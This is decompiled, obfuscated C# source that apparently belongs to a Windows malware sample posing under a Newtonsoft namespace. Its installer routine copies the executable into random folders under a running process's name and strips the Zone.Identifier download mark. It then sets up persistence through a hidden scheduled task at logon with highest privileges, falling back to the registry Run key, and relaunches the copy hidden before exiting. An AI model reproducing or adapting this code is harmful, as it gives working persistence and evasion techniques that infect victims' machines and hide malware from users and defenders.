using GDBD.Importers;
using GDBD.Mocks;
using GDBD.Specifications;
using GDBD.Structs;
using GDBD.Workers;
using Microsoft.Win32;
using Newtonsoft.Annotations;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace Newtonsoft.Common
{
	internal sealed class MapperEvent
	{
		[Serializable]
		[CompilerGenerated]
		private sealed class HelperComposer
		{
			public static readonly HelperComposer m_ContainerComposer;

			public static Predicate<string> _BaseComposer;

			public static Predicate<string> authenticationComposer;

			[MethodImpl(MethodImplOptions.NoInlining)]
			static HelperComposer()
			{
				//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
				//IL_0003: Incompatible stack heights: 0 vs 1
				//IL_0007: Incompatible stack heights: 0 vs 1
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 1
				SingletonReader.PushGlobal();
				m_ContainerComposer = new HelperComposer();
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			public HelperComposer()
			{
				//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
				//IL_0003: Incompatible stack heights: 0 vs 1
				//IL_0007: Incompatible stack heights: 0 vs 1
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 1
				SingletonReader.PushGlobal();
				base._002Ector();
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal bool _0001(string _0002)
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				return _0002.Contains("$");
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal bool _0002(string _0002)
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				return _0002.Contains("$");
			}
		}

		private static Process[] predicateEvent;

		[MethodImpl(MethodImplOptions.NoInlining)]
		private static Process TestFilter()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			return predicateEvent[new RepositoryEvent().MoveList(predicateEvent.Length)];
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		private static string ConcatFilter(string key)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			RepositoryEvent repositoryEvent = new RepositoryEvent();
			List<string> list = Directory.GetDirectories(key).ToList();
			list.RemoveAll((string _0002) => _0002.Contains("$"));
			string text = list[repositoryEvent.PopList(0, list.Count())];
			int num = repositoryEvent.PopList(1, list.Count());
			while (num > 0)
			{
				try
				{
					list = Directory.GetDirectories(text).ToList();
					list.RemoveAll((string _0002) => _0002.Contains("$"));
					text = list[repositoryEvent.PopList(0, list.Count())];
					num--;
				}
				catch
				{
					return text;
				}
			}
			return text;
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static void InvokeFilter()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			if (File.Exists(Path.GetDirectoryName(MappingListAnnotation.m_PolicyEvent) + "\\" + ClassEvent.RegisterFilter(Path.GetFileName(MappingListAnnotation.m_PolicyEvent))))
			{
				return;
			}
			string fileName = MappingListAnnotation.m_PolicyEvent;
			int num = new RepositoryEvent().PopList(1, 2);
			for (int i = 0; i < new RepositoryEvent().PopList(2, 10); i++)
			{
				string path = Path.Combine(Path.GetTempPath() + "\\" + ClassEvent.ResetFilter(GlobalIssuerImporter.SetList() + GlobalIssuerImporter.RemoveList()) + ".tmp");
				switch (num)
				{
				case 1:
					try
					{
						string processName2 = TestFilter().ProcessName;
						string text = ConcatFilter("C:\\");
						File.Copy(MappingListAnnotation.m_PolicyEvent, text + "\\" + processName2 + ".exe", overwrite: true);
						File.WriteAllText(text + "\\" + ClassEvent.RegisterFilter(processName2 + ".exe"), ReponseClassSpec.PublishFilter(new RepositoryEvent().PopList(10, 100)));
						Publisher.PrepareFilter(text + "\\" + processName2 + ".exe:Zone.Identifier");
						File.AppendAllText(path, "<$>" + text + "\\" + processName2 + ".exe");
						if (GlobalIssuerImporter.DestroyList())
						{
							ProcessStartInfo processStartInfo = new ProcessStartInfo("schtasks");
							processStartInfo.Arguments = "/create /tn \"" + processName2 + "\" /sc ONLOGON /tr \"'" + text + "\\" + processName2 + ".exe'\" /rl HIGHEST /f";
							processStartInfo.UseShellExecute = false;
							processStartInfo.CreateNoWindow = true;
							ProcessStartInfo startInfo2 = processStartInfo;
							Process process3 = Process.Start(startInfo2);
							process3.WaitForExit(1500);
							if (process3.ExitCode != 0)
							{
								using (RegistryKey registryKey3 = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true))
								{
									try
									{
										registryKey3.SetValue(processName2, "\"" + text + "\\" + processName2 + ".exe\"");
									}
									catch
									{
									}
								}
							}
						}
						else
						{
							using (RegistryKey registryKey4 = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true))
							{
								try
								{
									registryKey4.SetValue(processName2, "\"" + text + "\\" + processName2 + ".exe\"");
								}
								catch
								{
								}
							}
						}
						fileName = text + "\\" + processName2 + ".exe";
					}
					catch
					{
						i--;
					}
					break;
				case 2:
					try
					{
						Process process = TestFilter();
						string processName = process.ProcessName;
						string directoryName = Path.GetDirectoryName(Publisher.VerifyFilter(process));
						string[] files = Directory.GetFiles(directoryName);
						directoryName = Path.Combine(directoryName + "\\" + Path.GetFileNameWithoutExtension(files[new RepositoryEvent().MoveList(files.Length)]));
						Directory.CreateDirectory(directoryName);
						File.Copy(MappingListAnnotation.m_PolicyEvent, directoryName + "\\" + processName + ".exe", overwrite: true);
						File.WriteAllText(directoryName + "\\" + ClassEvent.RegisterFilter(processName + ".exe"), ReponseClassSpec.PublishFilter(new RepositoryEvent().PopList(10, 100)));
						Publisher.PrepareFilter(directoryName + "\\" + processName + ".exe:Zone.Identifier");
						File.AppendAllText(path, "<$>" + directoryName + "\\" + processName + ".exe");
						if (GlobalIssuerImporter.DestroyList())
						{
							ProcessStartInfo processStartInfo = new ProcessStartInfo("schtasks");
							processStartInfo.Arguments = "/create /tn \"" + processName + "\" /sc ONLOGON /tr \"'" + directoryName + "\\" + processName + ".exe'\" /rl HIGHEST /f";
							processStartInfo.UseShellExecute = false;
							processStartInfo.CreateNoWindow = true;
							ProcessStartInfo startInfo = processStartInfo;
							Process process2 = Process.Start(startInfo);
							process2.WaitForExit(1500);
							if (process2.ExitCode != 0)
							{
								using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true))
								{
									try
									{
										registryKey.SetValue(processName, "\"" + directoryName + "\\" + processName + ".exe\"");
									}
									catch
									{
									}
								}
							}
						}
						else
						{
							using (RegistryKey registryKey2 = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true))
							{
								try
								{
									registryKey2.SetValue(processName, "\"" + directoryName + "\\" + processName + ".exe\"");
								}
								catch
								{
								}
							}
						}
						fileName = directoryName + "\\" + processName + ".exe";
					}
					catch
					{
						i--;
					}
					break;
				}
			}
			try
			{
				Process.Start(new ProcessStartInfo
				{
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true,
					UseShellExecute = false,
					FileName = fileName
				});
				Environment.Exit(0);
				Application.Exit();
			}
			catch
			{
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public MapperEvent()
		{
			//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
			//IL_0003: Incompatible stack heights: 0 vs 1
			//IL_0007: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			SingletonReader.PushGlobal();
			base._002Ector();
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		static MapperEvent()
		{
			//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
			//IL_0003: Incompatible stack heights: 0 vs 1
			//IL_0007: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			SingletonReader.PushGlobal();
			predicateEvent = Process.GetProcesses();
		}
	}
}
